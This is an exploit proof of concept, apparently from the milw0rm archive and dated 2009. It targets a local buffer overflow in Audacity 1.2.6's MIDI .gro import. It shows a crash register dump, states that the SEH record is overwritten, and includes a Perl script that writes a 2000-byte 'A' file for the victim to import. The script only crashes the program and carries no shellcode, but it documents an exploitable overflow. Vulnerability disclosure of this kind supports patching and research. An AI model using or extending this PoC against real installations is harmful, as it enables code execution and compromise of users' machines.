# -----------------------------------------------------------
#  Author : Houssamix
# -----------------------------------------------------------

# Audacity 1.2.6  (.gro file ) Local buffer overflow POC

# download : http://audacity.sourceforge.net/
# Audacity® is free, open source software for recording and editing sounds.

# Description:
# When we select : project > import midi..   and we import ".gro" file contains long Chars
# The Program Will crash and The Following Happen:

# EAX:05050504  ECX:01414141  EDX:01520608  EBX:0012F154
# ESP:0012EF10  EBP:00000000  ESI:41414141  EDI:00000000
# EIP:006AEC54 audacity.006AEC54

# Access violation When Reading [41414141]
# And Also The Pointer to next SEH record and SE Handler Will gonna BE Over-wrote
 
# Poc  : 
# -------------------------------------------------------- 

#!/usr/bin/perl
#[*] Bug : Audacity 1.2.6  (.gro file ) Local buffer overflow
use warnings;
use strict;
my $chars   = "\x41" x 2000 ;
my $file="hsmx.gro";
open(my $FILE, ">>$file") or die "Cannot open $file: $!";
print $FILE $chars;
close($FILE);
print "$file has been created . import it in audacity  \n";


# ----------------------------------------------------------

# milw0rm.com [2009-01-01]
